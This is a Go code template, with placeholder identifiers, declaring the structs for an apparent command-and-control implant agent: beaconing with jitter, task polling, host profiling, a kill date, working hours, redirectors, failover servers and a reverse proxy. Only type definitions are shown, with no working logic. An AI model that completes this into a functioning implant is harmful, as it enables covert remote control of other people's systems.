// Core agent structure with essential fields
type {AGENT_STRUCT_NAME} struct {
	{AGENT_C2_URL_FIELD}                string
	{AGENT_ID_FIELD}                    string
	{AGENT_HEADERS_FIELD}               map[string]string
	{AGENT_HEARTBEAT_INTERVAL_FIELD}    int
	{AGENT_JITTER_FIELD}                float64
	{AGENT_REGISTER_URI_FIELD}          string
	{AGENT_TASKS_URI_FIELD}             string
	{AGENT_RESULTS_URI_FIELD}           string
	{AGENT_INTERACTIVE_URI_FIELD}       string
	{AGENT_INTERACTIVE_STATUS_URI_FIELD} string
	{AGENT_RUNNING_FIELD}               bool
	{AGENT_INTERACTIVE_MODE_FIELD}      bool
	{AGENT_HOSTNAME_FIELD}              string
	{AGENT_USERNAME_FIELD}              string
	{AGENT_OSINFO_FIELD}                string
	{AGENT_SECRET_KEY_FIELD}            *fernet.Key
	{AGENT_CURRENT_INTERACTIVE_TASK_FIELD} string
	{AGENT_DISABLE_SANDBOX_FIELD}       bool
	{AGENT_KILL_DATE_FIELD}             string
	{AGENT_WORKING_HOURS_FIELD}         struct {
		StartHour int      `json:"start_hour"`
		EndHour   int      `json:"end_hour"`
		Timezone  string   `json:"timezone"`
		Days      []int    `json:"days"`
	}
	{AGENT_REDIRECTOR_HOST_FIELD}       string
	{AGENT_REDIRECTOR_PORT_FIELD}       int
	{AGENT_USE_REDIRECTOR_FIELD}        bool
	{AGENT_FAILOVER_URLS_FIELD}         []string
	{AGENT_USE_FAILOVER_FIELD}          bool
	{AGENT_CURRENT_C2_URL_FIELD}        string
	{AGENT_CURRENT_FAIL_COUNT_FIELD}    int
	{AGENT_MAX_FAIL_COUNT_FIELD}        int
	{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} time.Time
	{AGENT_IN_FAILOVER_ATTEMPT_FIELD}   bool
	{AGENT_REVERSE_PROXY_ACTIVE_FIELD}  bool
	{AGENT_REVERSE_PROXY_STOP_CHAN_FIELD} chan struct{}
	{AGENT_REVERSE_PROXY_LOCK_FIELD}    sync.Mutex
}

type {TASK_STRUCT_NAME} struct {
	{TASK_ID_FIELD}      int64  `json:"id"`
	{TASK_COMMAND_FIELD} string `json:"command"`
}

type {TASK_RESULT_STRUCT_NAME} struct {
	{TASK_RESULT_TASK_ID_FIELD} string `json:"task_id"`
	{TASK_RESULT_RESULT_FIELD}  string `json:"result"`
}

type {API_RESPONSE_STRUCT_NAME} struct {
	Status   string      `json:"status"`
	Tasks    []{TASK_STRUCT_NAME}      `json:"tasks,omitempty"`
	Interval int         `json:"checkin_interval,omitempty"`
	Jitter   float64     `json:"jitter,omitempty"`
	InteractiveMode bool `json:"interactive_mode,omitempty"`
	Command  string      `json:"command,omitempty"`
	TaskID   string      `json:"task_id,omitempty"`
}